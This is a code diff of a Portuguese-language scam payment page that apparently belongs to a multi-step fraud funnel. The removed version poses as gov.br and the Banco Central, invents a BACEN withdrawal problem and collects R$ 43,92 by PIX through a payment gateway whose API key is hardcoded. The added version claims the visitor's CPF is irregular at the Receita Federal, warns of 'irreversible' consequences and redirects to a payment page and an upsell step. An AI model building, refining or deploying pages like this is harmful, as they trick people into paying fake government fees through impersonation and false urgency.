@@ -1,299 +1,354 @@
-<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
+<!DOCTYPE html><html lang="pt-BR"><head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Regulariza&ccedil;&atilde;o de Pend&ecirc;ncia e Libera&ccedil;&atilde;o de Saque</title>
   
-  <script src="https://cdn.tailwindcss.com"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
-  
+  <title>Regularização de Pendência</title>
+
   <style>
     :root {
-      --gov-navy: #0f2744;
-      --gov-blue: #1351b4;
-      --gov-accent: #059669;
+      --pink: #ec0978;
+      --pink-600: #d0086c;
+      --pink-50: #fff4fa;
+      --ink: #0f172a;
+      --muted: #6b7280;
       --radius: 16px;
     }
+
+    *, ::before, ::after { box-sizing: border-box; margin: 0; padding: 0 }
+    html { height: 100% }
     body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-      background: #f8fafc;
-      color: #1e293b;
+      min-height: 100%;
+      display: flex; flex-direction: column;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Helvetica", "Arial", sans-serif;
+      color: #111827;
+      background:
+        radial-gradient(ellipse 900px 500px at 65% -5%, rgba(236,9,120,.07) 0, transparent 70%),
+        radial-gradient(ellipse 600px 400px at 15% 20%, rgba(236,9,120,.04) 0, transparent 70%),
+        #f9fafb;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    /* ===== Topbar ===== */
+    .topbar {
+      position: sticky; top: 0; z-index: 50;
+      background: var(--pink);
+      border-bottom: 1px solid rgba(0,0,0,.1);
+    }
+    .nav {
+      max-width: 900px; margin: 0 auto; padding: 12px 20px;
+      display: flex; align-items: center; justify-content: space-between;
+    }
+    .brand { display: flex; align-items: center; gap: 10px }
+    .brand img { height: 40px; width: auto; display: block; filter: brightness(0) invert(1) }
+    .avatar { display: flex; align-items: center; gap: 8px }
+    .badge {
+      height: 36px; width: 36px; display: grid; place-items: center;
+      border-radius: 999px; background: rgba(255,255,255,.2); color: white;
+      font-weight: 700; font-size: .85rem;
+    }
+    .user-info { text-align: right; line-height: 1.3 }
+    .user-name { color: #fff; font-weight: 600; font-size: .85rem; white-space: nowrap }
+    .user-cpf { color: rgba(255,255,255,.7); font-size: .75rem; letter-spacing: .03em }
+
+    /* ===== Main ===== */
+    .hero {
+      flex: 1;
+      padding: 24px 16px 40px;
+    }
+    .shell { max-width: 480px; margin: 0 auto; display: grid; gap: 16px }
+
+    /* ===== Card ===== */
+    .card {
+      background: #fff;
+      border: 1px solid rgba(0,0,0,.06);
+      border-radius: var(--radius);
+      box-shadow: 0 1px 3px rgba(0,0,0,.04), 0 8px 32px rgba(236,9,120,.06);
+      overflow: hidden;
+    }
+    .card-head {
+      padding: 14px 20px;
+      display: flex; align-items: center; gap: 10px;
+      border-bottom: 1px solid rgba(0,0,0,.05);
+      background: linear-gradient(180deg, #fff 0%, #fffafd 100%);
+    }
+    .card-title { font-weight: 700; color: #111827; font-size: .95rem }
+    .card-body { padding: 20px }
+
+    /* Status dot */
+    .status-dot {
+      height: 10px; width: 10px; border-radius: 999px;
+      background: #ef4444; position: relative; flex-shrink: 0;
+    }
+    .status-dot::after {
+      content: ""; position: absolute; inset: -3px;
+      border-radius: 999px; background: #ef4444; opacity: .4;
+      animation: pulse 2s ease-in-out infinite;
+    }
+    @keyframes pulse {
+      0%,100% { transform: scale(1); opacity: .4 }
+      50% { transform: scale(1.6); opacity: 0 }
+    }
+
+    /* ===== Alerta ===== */
+    .alert-danger {
+      background: linear-gradient(135deg, #fef2f2, #fff5f5);
+      border: 1px solid #fca5a5;
+      border-left: 4px solid #ef4444;
+      border-radius: 12px;
+      padding: 16px;
+      font-size: .875rem;
+      color: #7f1d1d;
+      line-height: 1.7;
+    }
+    .alert-danger p {
       margin: 0;
-      padding: 0;
+    }
+    .alert-danger p + p { margin-top: 10px }
+    .alert-danger > strong:first-child {
+      display: block;
+      margin-bottom: 8px;
+      font-size: .95rem;
+      color: #991b1b;
+    }
+
+    /* ===== Badge pendência ===== */
+    .pendencia-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: #fef3c7;
+      border: 1px solid #fbbf24;
+      border-radius: 8px;
+      padding: 8px 14px;
+      font-size: .8rem;
+      font-weight: 600;
+      color: #92400e;
+    }
+    .pendencia-dot {
+      width: 8px; height: 8px;
+      border-radius: 999px;
+      animation: blink 1.5s infinite;
+    }
+    @keyframes blink {
+      0%, 100% { background: #ef4444; box-shadow: 0 0 6px rgba(239,68,68,.5) }
+      50% { background: #22c55e; box-shadow: 0 0 6px rgba(34,197,94,.5) }
+    }
+
+    /* ===== Tabela de taxas ===== */
+    .taxas-title {
+      font-weight: 700; font-size: .9rem; color: var(--ink);
+      margin-bottom: 10px;
     }
     .taxa-row {
-      display: flex; justify-content: space-between; align-items: center;
-      padding: 10px 12px; font-size: 0.85rem; border-bottom: 1px solid #e2e8f0;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 10px 12px;
+      font-size: .85rem;
+      border-bottom: 1.5px solid #cbd5e1;
     }
-    .taxa-row:last-child { border-bottom: none; }
-    .taxa-label { color: #64748b; font-weight: 500; }
-    .taxa-value { color: #0f172a; font-weight: 700; }
-    .btn-pulse { animation: pulse 2s infinite; }
-    @keyframes pulse {
-      0%, 100% { transform: scale(1); box-shadow: 0 4px 14px rgba(19,81,180,0.3); }
-      50% { transform: scale(1.02); box-shadow: 0 6px 20px rgba(19,81,180,0.5); }
+    .taxa-row:last-child { border-bottom: none }
+    .taxa-row:nth-child(even) { background: rgba(248,250,252,.6) }
+    .taxa-label { color: #4b5563 }
+    .taxa-value { font-weight: 600; color: var(--ink) }
+    .taxa-total {
+      background: #f1f5f9;
+      border: 1.5px solid #cbd5e1;
+      border-radius: 10px;
+      margin-top: 8px;
+      padding: 12px 14px;
+    }
+    .taxa-total .taxa-label { color: var(--ink); font-weight: 700 }
+    .taxa-total .taxa-value { color: var(--ink); font-weight: 800; font-size: 1.05rem }
+
+    /* ===== Botão ===== */
+    .btn {
+      display: block; width: 100%;
+      padding: 14px;
+      border: none; border-radius: 12px;
+      font-weight: 700; font-size: 1rem;
+      cursor: pointer;
+      text-align: center;
+      text-decoration: none;
+      color: #fff;
+      background: var(--pink);
+      box-shadow: 0 4px 14px rgba(236,9,120,.3);
+      transition: transform .15s, box-shadow .2s, background .2s;
+      animation: btn-pulse 2.5s infinite;
+    }
+    .btn:hover { background: var(--pink-600); box-shadow: 0 6px 20px rgba(236,9,120,.35) }
+    .btn:active { transform: scale(.98) }
+    @keyframes btn-pulse {
+      0%, 100% { transform: scale(1) }
+      50% { transform: scale(1.03) }
+    }
+
+    /* ===== Texto central ===== */
+    .text-center { text-align: center }
+    .desc { font-size: .85rem; color: #4b5563; line-height: 1.6 }
+    .desc-danger { color: #991b1b; font-weight: 600 }
+
+    /* ===== Footer ===== */
+    footer {
+      background: #1e2433;
+      color: #94a3b8;
+      font-size: .8rem;
+    }
+    .foot {
+      max-width: 1200px; margin: 0 auto; padding: 14px 20px;
+      display: flex; align-items: center; justify-content: center; gap: 10px; flex-wrap: wrap;
+    }
+    .foot-logo { height: 20px; width: auto; opacity: .7 }
+    .foot-sep { opacity: .4 }
+    .foot a { color: #cbd5e1; text-decoration: none; transition: color .2s }
+    .foot a:hover { color: #fff }
+
+    /* ===== Responsive ===== */
+    @media (max-width: 520px) {
+      .hero { padding: 16px 10px 32px }
+      .card-body { padding: 16px }
     }
   </style>
 </head>
-<body class="min-h-screen flex flex-col justify-between">
+<body>
 
-  <!-- TOPBAR GOV.BR -->
-  <header class="bg-[#0f2744] text-white py-3 px-4 shadow-md sticky top-0 z-30">
-    <div class="max-w-xl mx-auto flex items-center justify-between">
-      <div class="flex items-center gap-2">
-        <span class="font-black text-xl tracking-tight text-white">gov.br</span>
-        <span class="text-xs bg-blue-700/60 px-2 py-0.5 rounded text-blue-200 uppercase font-bold">Oficial</span>
+  <!-- ===== TOPBAR ===== -->
+  <header class="topbar">
+    <div class="nav">
+      <div class="brand">
+        <img src="images/logo.png" alt="Logo" onerror="this.style.display='none'">
       </div>
-      <div class="text-right">
-        <div id="u-nome" class="text-xs font-bold text-slate-100">Vendas</div>
-        <div id="u-cpf" class="text-[11px] text-blue-300 font-mono">000.***.***-00</div>
+      <div class="avatar">
+        <div class="user-info">
+          <div class="user-name" id="user-display-name"></div>
+          <div class="user-cpf" id="user-display-cpf"></div>
+        </div>
+        <div class="badge">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
+            <circle cx="12" cy="8.5" r="3.2" fill="#ffffff"></circle>
+            <path d="M4.5 19.5c0-3.2 3.4-5.2 7.5-5.2s7.5 2 7.5 5.2v.3H4.5v-.3z" fill="#ffffff"></path>
+          </svg>
+        </div>
       </div>
     </div>
   </header>
 
-  <!-- CONTEUDO PRINCIPAL -->
-  <main class="max-w-xl w-full mx-auto px-4 py-6 flex-1 space-y-4">
-    
-    <!-- ETAPA ATUAL -->
-    <div class="bg-blue-50 border border-blue-200 rounded-xl p-3 flex items-center justify-between text-xs">
-      <span class="font-bold text-blue-900 flex items-center gap-1.5">
-        <i class="fa-solid fa-shield-halved text-blue-600"></i> Etapa 1 de 4
-      </span>
-      <span class="text-blue-700 font-medium">Regulariza&ccedil;&atilde;o de Pend&ecirc;ncia e Libera&ccedil;&atilde;o de Saque</span>
-    </div>
+  <!-- ===== MAIN ===== -->
+  <main class="hero">
+    <div class="shell">
 
-    <!-- ALERTA DE PENDENCIA -->
-    <div class="bg-white rounded-2xl border border-red-200 shadow-sm overflow-hidden">
-      <div class="bg-red-500 text-white px-4 py-2.5 flex items-center gap-2 font-bold text-sm">
-        <i class="fa-solid fa-triangle-exclamation"></i>
-        <span>PEND&Ecirc;NCIA DE REGISTRO LOCALIZADA NO BACEN</span>
-      </div>
-      <div class="p-5 space-y-3 text-sm text-slate-700 leading-relaxed">
-        <p>Identificamos uma pend&ecirc;ncia cadastral no processamento da sua Ordem Banc&aacute;ria de Saque. &Eacute; obrigat&oacute;ria a liquida&ccedil;&atilde;o da taxa de registro e cust&oacute;dia para autorizar o repasse imediato do seu saldo residual para a sua chave PIX.</p>
-        <div class="bg-amber-50 border border-amber-200 rounded-lg p-3 text-amber-900 text-xs flex items-center gap-2 font-medium">
-          <i class="fa-solid fa-clock text-amber-600 text-base shrink-0"></i>
-          <span>Prazo de liquida&ccedil;&atilde;o: <strong>10 minutos</strong> antes do cancelamento da ordem.</span>
+      <!-- Alerta -->
+      <div class="card">
+        <div class="card-head">
+          <span class="status-dot"></span>
+          <div class="card-title">Irregularidade Detectada</div>
+        </div>
+        <div class="card-body">
+          <div class="alert-danger">
+            <strong>CPF IRREGULAR NA RECEITA FEDERAL</strong>
+            <p>Identificamos uma pendência fiscal crítica vinculada ao seu CPF nos registros da Receita Federal.</p>
+            <p style="margin-top:10px">Caso a regularização não seja concluída imediatamente, o impacto será <strong>irreversível</strong>.</p>
+          </div>
+
+          <div class="text-center" style="margin:16px 0">
+            <div class="pendencia-badge">
+              <span class="pendencia-dot"></span>
+              Pendência Localizada
+            </div>
+          </div>
         </div>
       </div>
-    </div>
 
-    <!-- DETALHAMENTO DE TAXAS -->
-    <div class="bg-white rounded-2xl border border-slate-200 shadow-sm p-4">
-      <div class="flex items-center gap-2 font-bold text-slate-800 text-sm mb-3 pb-2 border-b border-slate-100">
-        <i class="fa-solid fa-receipt text-blue-600"></i>
-        <span>Detalhamento dos Encargos</span>
-      </div>
-      
-      <div class="space-y-1">
-                  <div class="taxa-row">
+      <!-- Detalhamento das taxas -->
+      <div class="card">
+        <div class="card-head">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#6b7280" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="3"></rect><path d="M9 7h6M7 12h10M9 17h6"></path></svg>
+          <div class="card-title">Detalhamento das Taxas</div>
+        </div>
+        <div class="card-body" style="padding:12px 16px 16px">
+          <div class="taxa-row">
             <span class="taxa-label">Taxa administrativa</span>
             <span class="taxa-value">R$ 29,24</span>
-          </div>          <div class="taxa-row">
-            <span class="taxa-label">Emiss&atilde;o da ordem banc&aacute;ria</span>
+          </div>
+          <div class="taxa-row">
+            <span class="taxa-label">Taxa de regularização</span>
             <span class="taxa-value">R$ 7,53</span>
-          </div>          <div class="taxa-row">
-            <span class="taxa-label">Registro e compensa&ccedil;&atilde;o BACEN</span>
+          </div>
+          <div class="taxa-row">
+            <span class="taxa-label">Multa por atraso</span>
             <span class="taxa-value">R$ 2,73</span>
-          </div>          <div class="taxa-row">
-            <span class="taxa-label">Cust&oacute;dia de processamento</span>
+          </div>
+          <div class="taxa-row">
+            <span class="taxa-label">Taxa de processamento</span>
             <span class="taxa-value">R$ 4,42</span>
           </div>
-        <div class="taxa-row bg-slate-50 rounded-lg mt-2 p-3 font-black text-base border border-slate-200">
-          <span class="text-slate-900 font-bold">Valor Total</span>
-          <span class="text-blue-700 text-lg">R$ 43,92</span>
-        </div>
-      </div>
-    </div>
-
-    <!-- BOTAO DE ACAO -->
-    <button id="btn-pay" onclick="gerarPixUpsell()" class="w-full bg-[#1351b4] hover:bg-blue-700 text-white font-extrabold py-4 px-6 rounded-xl shadow-lg transition btn-pulse text-center flex items-center justify-center gap-3 text-base cursor-pointer">
-      <i class="fa-brands fa-pix text-xl text-emerald-400"></i>
-      <span>REGULARIZAR E LIBERAR SAQUE AGORA</span>
-    </button>
-
-    <div class="text-center">
-      <span class="text-[11px] text-slate-400 flex items-center justify-center gap-1">
-        <i class="fa-solid fa-lock text-emerald-600"></i> Ambiente Seguro com Criptografia de Ponta a Ponta
-      </span>
-    </div>
-
-  </main>
-
-  <!-- MODAL CHECKOUT TECHBYNET PIX -->
-  <div id="modal-pix" class="fixed inset-0 z-50 bg-black/60 backdrop-blur-sm hidden flex items-center justify-center p-4">
-    <div class="bg-white rounded-3xl max-w-md w-full p-6 text-center space-y-4 shadow-2xl relative">
-      
-      <div class="flex items-center justify-between border-b border-slate-100 pb-3">
-        <div class="flex items-center gap-2">
-          <i class="fa-brands fa-pix text-emerald-600 text-2xl"></i>
-          <span class="font-bold text-slate-800 text-sm">Pagamento via PIX</span>
-        </div>
-        <span class="text-xs bg-emerald-100 text-emerald-800 font-bold px-2 py-0.5 rounded">Valor: R$ 43,92</span>
-      </div>
-
-      <!-- LOADING -->
-      <div id="pix-loading" class="py-8 space-y-3">
-        <div class="w-10 h-10 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto"></div>
-        <p class="text-sm font-semibold text-slate-600">Gerando cobran&ccedil;a PIX oficial...</p>
-      </div>
-
-      <!-- QR CODE CONTAINER -->
-      <div id="pix-content" class="hidden space-y-4">
-        <div class="p-3 bg-slate-50 border border-slate-200 rounded-2xl inline-block mx-auto shadow-inner">
-          <div id="qrcode-box" class="flex justify-center"></div>
-        </div>
-
-        <div>
-          <p class="text-xs text-slate-500 mb-2">Copie o c&oacute;digo abaixo e pague em qualquer aplicativo banc&aacute;rio:</p>
-          <div class="flex gap-2">
-            <input type="text" id="pix-code" readonly class="w-full bg-slate-100 border border-slate-300 rounded-xl px-3 py-2 text-xs font-mono select-all">
-            <button onclick="copiarPix()" id="btn-copy" class="bg-emerald-600 hover:bg-emerald-700 text-white font-bold px-4 py-2 rounded-xl text-xs shrink-0 transition flex items-center gap-1">
-              <i class="fa-solid fa-copy"></i> Copiar
-            </button>
+          <div class="taxa-row taxa-total">
+            <span class="taxa-label">Total</span>
+            <span class="taxa-value">R$ 43,92</span>
           </div>
         </div>
-
-        <div class="bg-emerald-50 border border-emerald-200 rounded-xl p-3 text-xs text-emerald-800 flex items-center justify-center gap-2 font-semibold animate-pulse">
-          <i class="fa-solid fa-arrows-rotate animate-spin"></i>
-          <span>Aguardando confirma&ccedil;&atilde;o de pagamento...</span>
-        </div>
       </div>
 
-    </div>
-  </div>
+      <!-- Botão -->
+      <a href="index.html#" class="btn" id="btn-regularizar">REGULARIZAR AGORA</a>
 
-  <!-- FOOTER -->
-  <footer class="bg-slate-900 text-slate-400 py-4 px-4 text-center text-xs border-t border-slate-800">
-    <p>&copy; 2026 Sistema de Pagamentos Brasileiro &mdash; Banco Central do Brasil</p>
+    </div>
+  </main>
+
+  <footer>
+    <div class="foot">
+      <img src="images/logo.png" alt="Logo" class="foot-logo">
+      <span>© <span id="y">2026</span> Central</span>
+      <span class="foot-sep">·</span>
+      <a href="index.html#">Privacidade</a>
+      <span class="foot-sep">·</span>
+      <a href="index.html#">Termos</a>
+    </div>
   </footer>
 
+  <!-- ===== SCRIPTS ===== -->
   <script>
-    const TECHBYNET_KEY = "8db67d23-46c8-42fa-8e58-8ce3005dcf22";
-    let urlParams = new URLSearchParams(window.location.search);
-    let rawCpf = urlParams.get('cpf') || localStorage.getItem('userCPF') || '';
-    let cpf = rawCpf.replace(/\D/g, '') || "07580365316";
-    let nome = (urlParams.get('nome') || localStorage.getItem('userName') || 'Vendas da Silva').trim();
+    document.getElementById('y').textContent = new Date().getFullYear();
 
-    if (nome && nome !== 'Vendas da Silva') {
-      document.getElementById('u-nome').textContent = nome;
-      try { localStorage.setItem('userName', nome); } catch(e){}
-    }
-    if (cpf && cpf.length === 11) {
-      document.getElementById('u-cpf').textContent = cpf.slice(0,3) + '.***.***-' + cpf.slice(-2);
-      try { localStorage.setItem('userCPF', cpf); } catch(e){}
-    }
-
-    let transactionId = null;
-    let pollInterval = null;
-
-    async function gerarPixUpsell() {
-      document.getElementById('modal-pix').classList.remove('hidden');
-      document.getElementById('pix-loading').classList.remove('hidden');
-      document.getElementById('pix-content').classList.add('hidden');
-
-      let payload = {
-        amount: 4392,
-        paymentMethod: "PIX",
-        customer: {
-          name: nome || "Vendas da Silva",
-          email: "cliente" + cpf.slice(0,6) + "@email.com",
-          document: {
-            number: cpf,
-            type: "CPF"
-          },
-          phone: "11999999999"
-        },
-        items: [{
-          title: "Servicos e Taxas",
-          unitPrice: 4392,
-          quantity: 1,
-          tangible: false
-        }],
-        pix: { expiresInDays: 1 }
-      };
-
-      try {
-        let res = await fetch("https://api-gateway.techbynet.com/api/user/transactions", {
-          method: "POST",
-          headers: {
-            "x-api-key": TECHBYNET_KEY,
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify(payload)
-        });
-        let data = await res.json();
-        let qrcode = (data && data.data && data.data.pix && data.data.pix.qrcode) || (data && data.data && data.data.qrCode);
-        if (data && data.data && qrcode) {
-          let code = qrcode;
-          transactionId = data.data.id;
-
-          document.getElementById('pix-code').value = code;
-          document.getElementById('qrcode-box').innerHTML = "";
-          new QRCode(document.getElementById('qrcode-box'), {
-            text: code,
-            width: 180,
-            height: 180
-          });
-
-          document.getElementById('pix-loading').classList.add('hidden');
-          document.getElementById('pix-content').classList.remove('hidden');
-
-          iniciarVerificacaoStatus(transactionId);
-        } else {
-          console.error("TechbyNet Error:", data);
-          alert("Nao foi possivel gerar a cobranca. Tente novamente.");
-          document.getElementById('modal-pix').classList.add('hidden');
-        }
-      } catch(err) {
-        console.error("Fetch Error:", err);
-        alert("Erro de conexao com o gateway. Tente novamente.");
-        document.getElementById('modal-pix').classList.add('hidden');
+    // Guard: só pode acessar se veio do passo correto
+    (function() {
+      var p = new URLSearchParams(window.location.search);
+      if (!p.get('funil_ok')) {
+        // Sem token de funil — redireciona para pagamento principal
+        var back = new URL('/pagamento/', window.location.origin);
+        p.forEach(function(v, k) { back.searchParams.set(k, v); });
+        window.location.replace(back.toString());
+        return;
       }
-    }
+    })();
 
-    function copiarPix() {
-      let input = document.getElementById('pix-code');
-      input.select();
-      input.setSelectionRange(0, 99999);
-      navigator.clipboard.writeText(input.value);
-      let btn = document.getElementById('btn-copy');
-      btn.innerHTML = '<i class="fa-solid fa-check"></i> Copiado!';
-      btn.classList.replace('bg-emerald-600', 'bg-blue-600');
-      setTimeout(() => {
-        btn.innerHTML = '<i class="fa-solid fa-copy"></i> Copiar';
-        btn.classList.replace('bg-blue-600', 'bg-emerald-600');
-      }, 2000);
-    }
+    // User display
+    (function() {
+      const nome = localStorage.getItem('userName') || '';
+      const cpf = localStorage.getItem('userCPF') || '';
+      if (nome) {
+        const partes = nome.trim().split(/\s+/);
+        const exibir = partes.length > 1 ? partes[0] + ' ' + partes[partes.length - 1] : partes[0];
+        document.getElementById('user-display-name').textContent = exibir;
+      }
+      if (cpf) {
+        const limpo = cpf.replace(/\D/g, '');
+        const mascarado = limpo.slice(0,3) + '.\u2022\u2022\u2022.\u2022\u2022\u2022-' + limpo.slice(-2);
+        document.getElementById('user-display-cpf').textContent = mascarado;
+      }
+    })();
 
-    function iniciarVerificacaoStatus(id) {
-      if (pollInterval) clearInterval(pollInterval);
-      pollInterval = setInterval(async () => {
-        try {
-          let res = await fetch("https://api-gateway.techbynet.com/api/user/transactions/" + id, {
-            method: "GET",
-            headers: { "x-api-key": TECHBYNET_KEY }
-          });
-          let json = await res.json();
-          if (json && json.data) {
-            let st = String(json.data.status || "").toUpperCase();
-            if (st === "PAID" || st === "APPROVED" || st === "COMPLETED") {
-              clearInterval(pollInterval);
-              
-              let p = window.location.pathname;
-              let bp = "";
-              if (p.indexOf("/replay/9345488724234") !== -1) bp = "/replay/9345488724234";
-              else if (p.indexOf("/9345488724234") !== -1) bp = "/9345488724234";
-              else if (p.indexOf("/replay") !== -1) bp = "/replay";
-
-              let nextUrl = bp + "/upsell/2/" + "?cpf=" + encodeURIComponent(cpf) + "&nome=" + encodeURIComponent(nome);
-              window.location.href = nextUrl;
-            }
-          }
-        } catch(e){}
-      }, 2500);
-    }
+    // CTA redirect
+    document.getElementById('btn-regularizar').addEventListener('click', function(e) {
+      e.preventDefault();
+      var params = new URLSearchParams(window.location.search);
+      params.set('valor', '4392');
+      params.set('product_name', 'Taxa De Regularização RF');
+      params.set('funil_ok', '1');
+      params.set('next', '/upsell/2/');
+      window.location.href = '/pagamento/?' + params.toString();
+    });
   </script>
-</body>
-</html>
+
+
+</body></html>
